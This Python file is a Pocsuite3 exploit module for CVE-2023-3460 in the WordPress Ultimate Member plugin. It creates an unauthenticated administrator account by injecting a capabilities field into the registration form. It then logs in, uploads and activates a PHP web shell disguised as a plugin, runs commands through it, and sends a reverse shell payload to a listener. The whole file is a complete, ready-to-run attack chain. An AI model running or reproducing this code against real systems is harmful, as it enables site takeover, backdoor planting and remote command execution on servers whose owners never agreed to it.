from pocsuite3.api import VUL_TYPE, POC_CATEGORY, POCBase, register_poc, requests, Output, OptString, REVERSE_PAYLOAD, get_listener_ip, get_listener_port, random_str
from collections import OrderedDict
import re
import io
import zipfile
import urllib.parse
from bs4 import BeautifulSoup
import time

class UltimateMemberCVE20233460(POCBase):
    vulID = 'CVE-2023-3460'
    version = '1.0'
    author = ['Pocsuite3']
    vulDate = '2023-06-27'
    createDate = '2025-07-22'
    updateDate = '2025-07-22'
    references = ['https://www.cve.org/CVERecord?id=CVE-2023-3460']
    name = 'WordPress_CVE-2023-3460'
    appPowerLink = 'https://wordpress.org/plugins/ultimate-member/'
    appName = 'Wordpress Ultimate Member'
    appVersion = '<= 2.6.7'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''
        CVE-2023-3460: The Ultimate Member plugin for WordPress allows unauthenticated attackers to create an administrator account
        by manipulating form submissions due to improper privilege validation. This PoC also uploads a malicious plugin to achieve RCE.
        WordPress Ultimate Member Plugin <= 2.6.7 Unauthenticated Admin Creatio CVE-2023-3460'
    '''
    samples = []
    install_requires = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o['username'] = OptString('gordo', description='Username for the admin account', require=False)
        o['email'] = OptString('hacked@gmail.com', description='Email for the admin account', require=False)
        o['password'] = OptString('HackingAnotherWebsite15', description='Password for the admin account', require=False)
        o['cmd'] = OptString('whoami', description='Command to execute in the web shell', require=False)
        o['form_id'] = OptString('6', description='Form ID for registration (default: 6)', require=False)
        return o

    def _check_version(self):
        target_version_url = f"{self.url.rstrip('/')}/wp-content/plugins/ultimate-member/readme.txt"
        try:
            r = requests.get(target_version_url, verify=False, timeout=10)
            r.raise_for_status()
            version_match = re.search(r"Stable tag: (.*)", r.text)
            if not version_match:
                return None, False
            version = version_match.groups()[0]
            version_num = int(version.replace('.', ''))
            print(f"Plugin version: {version}, Vulnerable: {version_num < 277}")
            return version, version_num < 277
        except Exception as e:
            e
            return None, False

    def _get_nonce(self, register_url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
        try:
            r = requests.get(register_url, headers=headers, verify=False, timeout=10)
            r.raise_for_status()
            nonce_match = re.search(r'name="_wpnonce" value="([a-z0-9]{10})"', r.text)
            if nonce_match:
                nonce = nonce_match.groups()[0]
                return nonce
            return None
        except Exception as e:
            e
            return None

    def _get_form_id(self, register_url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
        try:
            r = requests.get(register_url, headers=headers, verify=False, timeout=10)
            r.raise_for_status()
            soup = BeautifulSoup(r.text, 'html.parser')
            form_id_input = soup.find('input', {'name': 'form_id'})
            if form_id_input and 'value' in form_id_input.attrs:
                form_id = form_id_input['value']
                return form_id
            return self.get_option('form_id')
        except Exception as e:
            e
            return self.get_option('form_id')

    def _add_user(self, form_id, nonce, username, email, password):
        register_url = f"{self.url.rstrip('/')}/index.php/?page_id=11"
        data = {
            f'user_login-{form_id}': username,
            f'user_email-{form_id}': email,
            f'user_password-{form_id}': password,
            f'confirm_user_password-{form_id}': password,
            f'first_name-{form_id}': 'Admin',
            f'last_name-{form_id}': '0xgordo',
            'form_id': form_id,
            'um_request': '',
            '_wpnonce': nonce,
            'wp_càpabilities[administrator]':1
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        for attempt in range(3):
            try:
                r = requests.post(register_url, data=data, headers=headers, verify=False, allow_redirects=False, timeout=10)
                if r.status_code == 302:
                    return True
                time.sleep(5)
            except Exception as e:
                e
        return False

    def _verify_user_role(self, session, username, admin_url):
        try:
            users_page = f"{admin_url}users.php"
            for attempt in range(3):
                response = session.get(users_page, verify=False, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if 'user-new.php' in response.text or any('administrator' in role.get_text().lower() for role in soup.find_all('td', {'class': 'role'})):
                        return True
                    print(f'{username} không có quyền admin (attempt {attempt + 1})')
            return False
        except Exception as e:
            return False

    def _attack(self):
        result = {}
        base_url = self.url.rstrip('/')
        register_url = f"{base_url}/register/"
        login_url = f"{base_url}/wp-login.php"
        admin_url = f"{base_url}/wp-admin/"
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-plugin"
        plugins_url = f"{base_url}/wp-admin/plugins.php"
        plugin_dir = 'nxploitplugin'
        rce_url = f"{base_url}/wp-content/plugins/{plugin_dir}/web_shell.php"

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })

        username = self.get_option('username')
        password = self.get_option('password')
        email = self.get_option('email')
        cmd = self.get_option('cmd')
        
        form_id = self._get_form_id(register_url)
        if not form_id:
            return self.parse_output({'Error': 'Failed to retrieve form ID'})

        nonce = self._get_nonce(register_url)
        if not nonce:
            return self.parse_output({'Error': 'Failed to retrieve nonce'})

        if not self._add_user(form_id, nonce, username, email, password):
            email = f"{username}_{int(time.time())}@example.com"
            if not self._add_user(form_id, nonce, username, email, password):
                return self.parse_output({'Error': f'Failed to create admin user with username {username} and emails or {email}'})

        try:
            login_page = session.get(login_url, verify=False, timeout=10)
            login_page.raise_for_status()
            soup = BeautifulSoup(login_page.content, 'html.parser')
            nonce_input = soup.find('input', {'name': 'wp-submit'})
            nonce = nonce_input['value'] if nonce_input and 'value' in nonce_input.attrs else 'Log In'
        except Exception as e:
            return self.parse_output({'Error': f'Failed to fetch login page: {str(e)}'})

        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': admin_url,
            'testcookie': '1'
        }
        try:
            response = session.post(login_url, data=login_data, verify=False, timeout=10, allow_redirects=True)
            response.raise_for_status()
            if 'wp-admin' not in response.url:
                return self.parse_output({'Error': 'Login failed: Redirected to non-admin page, user may not have admin privileges'})

            admin_page = session.get(admin_url, verify=False, timeout=10)
            admin_page.raise_for_status()
            if 'wp-admin' not in admin_page.url:
                return self.parse_output({'Error': 'Login failed: Could not access admin dashboard, user may not have admin privileges'})

            if not self._verify_user_role(session, username, admin_url):
                return self.parse_output({'Error': f'Login successful but user {username} does not have admin privileges'})

        except Exception as e:
            return self.parse_output({'Error': f'Login failed: {str(e)}'})

        plugin_exists = False
        activation_status = 'Not attempted'
        try:
            plugins_page = session.get(plugins_url, verify=False, timeout=10)
            plugins_page.raise_for_status()
            plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
            plugin_row = plugins_soup.find('tr', {'data-plugin': f'{plugin_dir}/web_shell.php'})
            if plugin_row:
                plugin_exists = True
                if 'active' in plugin_row.get('class', []):
                    activation_status = 'Success (already active)'
                else:
                    activate_link = plugin_row.find('a', href=re.compile(r'action=activate'))
                    if activate_link and '_wpnonce' in activate_link['href']:
                        nonce_match = re.search(r'_wpnonce=([a-z0-9]+)', activate_link['href'])
                        activate_nonce = nonce_match.group(1) if nonce_match else None
                        if activate_nonce:
                            encoded_plugin_path = urllib.parse.quote(f'{plugin_dir}/web_shell.php')
                            activate_url = f'{base_url}/wp-admin/plugins.php?action=activate&plugin={encoded_plugin_path}&_wpnonce={activate_nonce}'
                            activate_response = session.get(activate_url, verify=False, timeout=15, allow_redirects=True)
                            if activate_response.status_code in (200, 302):
                                time.sleep(4)
                                plugins_page_after = session.get(plugins_url, verify=False, timeout=10)
                                plugins_page_after.raise_for_status()
                                plugins_soup_after = BeautifulSoup(plugins_page_after.content, 'html.parser')
                                plugin_row_after = plugins_soup_after.find('tr', {'data-plugin': f'{plugin_dir}/web_shell.php'})
                                if plugin_row_after and 'active' in plugin_row_after.get('class', []):
                                    activation_status = 'Success'
                                else:
                                    activation_status = f'Failed: Plugin not active - {activate_response.text[:100]}'
                            else:
                                activation_status = f'Failed: HTTP status {activate_response.status_code} - {activate_response.text[:100]}'
                        else:
                            activation_status = 'Failed: Could not extract activation nonce'
                    else:
                        activation_status = 'Failed: Could not find activation link'
        except Exception as e:
            return self.parse_output({'Error': f'Error checking plugin existence: {str(e)}'})

        upload_status = 'Not attempted'
        if not plugin_exists:
            webshell_payload = """<?php
            /**
            * Plugin Name: NxploitPlugin
            * Version: 1.0
            * Author: Test
            */
            if(isset($_GET['cmd'])) {
                ob_start();
                system($_GET['cmd'] . ' 2>&1', $retval);
                $output = ob_get_clean();
                echo $output ? $output : 'No output';
            }
            ?>"""

            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr(f'{plugin_dir}/web_shell.php', webshell_payload)
            zip_buffer.seek(0)

            try:
                upload_page = session.get(f'{base_url}/wp-admin/plugin-install.php?tab=upload', verify=False, timeout=10)
                upload_page.raise_for_status()
                upload_soup = BeautifulSoup(upload_page.content, 'html.parser')
                nonce_input = upload_soup.find('input', {'name': '_wpnonce'})
                if not nonce_input or 'value' not in nonce_input.attrs:
                    return self.parse_output({'Error': 'Failed to fetch upload nonce'})
                upload_nonce = nonce_input['value']
            except Exception as e:
                return self.parse_output({'Error': f'Failed to fetch plugin upload page: {str(e)}'})

            files = {
                'pluginzip': ('nxploitplugin.zip', zip_buffer, 'application/zip'),
                'install-plugin-submit': (None, 'Install Now')
            }
            upload_data = {
                '_wpnonce': upload_nonce,
                '_wp_http_referer': f'{base_url}/wp-admin/plugin-install.php?tab=upload',
                'install-plugin-submit': 'Install Now'
            }
            try:
                upload_response = session.post(upload_url, files=files, data=upload_data, verify=False, timeout=15)
                upload_response.raise_for_status()
                upload_status = 'Success' if 'Plugin installed successfully' in upload_response.text or upload_response.status_code == 200 else 'Failed'
                if upload_status == 'Failed':
                    return self.parse_output({'Error': f'Plugin upload failed: {upload_response.text[:100]}'})
            except Exception as e:
                return self.parse_output({'Error': f'Plugin upload failed: {str(e)}'})

            try:
                plugins_page = session.get(plugins_url, verify=False, timeout=10)
                plugins_page.raise_for_status()
                plugins_soup = BeautifulSoup(plugins_page.content, 'html.parser')
                plugin_row = plugins_soup.find('tr', {'data-plugin': f'{plugin_dir}/web_shell.php'})
                if plugin_row:
                    activate_link = plugin_row.find('a', href=re.compile(r'action=activate'))
                    if activate_link and '_wpnonce' in activate_link['href']:
                        nonce_match = re.search(r'_wpnonce=([a-z0-9]+)', activate_link['href'])
                        activate_nonce = nonce_match.group(1) if nonce_match else None
                        if activate_nonce:
                            encoded_plugin_path = urllib.parse.quote(f'{plugin_dir}/web_shell.php')
                            activate_url = f'{base_url}/wp-admin/plugins.php?action=activate&plugin={encoded_plugin_path}&_wpnonce={activate_nonce}'
                            activate_response = session.get(activate_url, verify=False, timeout=15, allow_redirects=True)
                            if activate_response.status_code in (200, 302):
                                time.sleep(4)
                                plugins_page_after = session.get(plugins_url, verify=False, timeout=10)
                                plugins_page_after.raise_for_status()
                                plugins_soup_after = BeautifulSoup(plugins_page_after.content, 'html.parser')
                                plugin_row_after = plugins_soup_after.find('tr', {'data-plugin': f'{plugin_dir}/web_shell.php'})
                                if plugin_row_after and 'active' in plugin_row_after.get('class', []):
                                    activation_status = 'Success'
                                else:
                                    activation_status = f'Failed: Plugin not active - {activate_response.text[:100]}'
                            else:
                                activation_status = f'Failed: HTTP status {activate_response.status_code} - {activate_response.text[:100]}'
                        else:
                            activation_status = 'Failed: Could not extract activation nonce'
                    else:
                        activation_status = 'Failed: Could not find activation link'
                        activate_form = plugins_soup.find('form', {'action': re.compile(r'plugins\.php')})
                        if activate_form:
                            activate_nonce = activate_form.find('input', {'name': '_wpnonce'})['value'] if activate_form.find('input', {'name': '_wpnonce'}) else None
                            if activate_nonce:
                                activate_data = {
                                    'action': 'activate',
                                    'plugin': f'{plugin_dir}/web_shell.php',
                                    '_wpnonce': activate_nonce,
                                    '_wp_http_referer': plugins_url
                                }
                                activate_response = session.post(plugins_url, data=activate_data, verify=False, timeout=15)
                                if activate_response.status_code in (200, 302):
                                    activation_status = 'Success (via form)'
                                else:
                                    activation_status = f'Failed: Form activation failed - {activate_response.text[:100]}'
                            else:
                                activation_status = 'Failed: Could not find form nonce'
                else:
                    activation_status = 'Failed: Could not find plugin row'
            except Exception as e:
                activation_status = f'Failed: Error fetching plugins page - {str(e)}'

        cmd_output = None
        if activation_status.startswith('Success') and cmd:
            rce_url = f'{rce_url}?cmd={urllib.parse.quote(cmd)}'
            for attempt in range(3):
                try:
                    cmd_response = session.get(rce_url, verify=False, timeout=15)
                    cmd_response.raise_for_status()
                    cmd_output = cmd_response.text.strip()
                    if cmd_output and cmd_output != 'No output':
                        break
                    else:
                        print(f"[DEBUG] RCE attempt {attempt + 1} returned no output")
                except Exception as e:
                    e

        result = {
            'AttackInfo': {
                'Web_Shell_URL': rce_url,
                'Web_Shell_Status': 'Command executed' if cmd_output and cmd_output != 'No output' else 'Command execution failed',
                'Command_Output': cmd_output if cmd_output and cmd_output != 'No output' else None
            }
        }
        return self.parse_output(result)

    def _verify(self):
        result = {}
        version, is_vulnerable = self._check_version()
        if is_vulnerable:
            # result['VerifyInfo'] = {
            #     'URL': self.url,
            #     'Version': version,
            #     'Message': 'Target is vulnerable'
            # }
            result['URL'] = self.url
            result['Version'] = version
            result['Message'] = 'Target is vulnerable'
        else:
            result['URL'] = self.url
            result['Version'] = version
            result['Message'] = 'Target is not vulnerable'
        return self.parse_output(result)
    def _shell(self):
            result = {}
            web_shell_url = self.url.rstrip('/') + '/wp-content/plugins/nxploitplugin/web_shell.php'
            
            cmd = REVERSE_PAYLOAD.PHP.format(get_listener_ip(), get_listener_port())
            encoded_payload = urllib.parse.quote(cmd)
            
            try:
                rce_url = f"{web_shell_url}?cmd={encoded_payload}"
                response = requests.get(rce_url, verify=False, timeout=20)
                response.raise_for_status()
                
                result['ShellInfo'] = {
                    'Web_Shell_URL': rce_url,
                    'Status': 'Reverse shell executed successfully',
                    'Listener': f"{get_listener_ip()}:{get_listener_port()}"
                }
            except requests.exceptions.RequestException as e:
                result['Error'] = f"Reverse shell execution {e}"
            return self.parse_output(result)
    
    def parse_output(self, result):
        self.result = result
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(UltimateMemberCVE20233460)
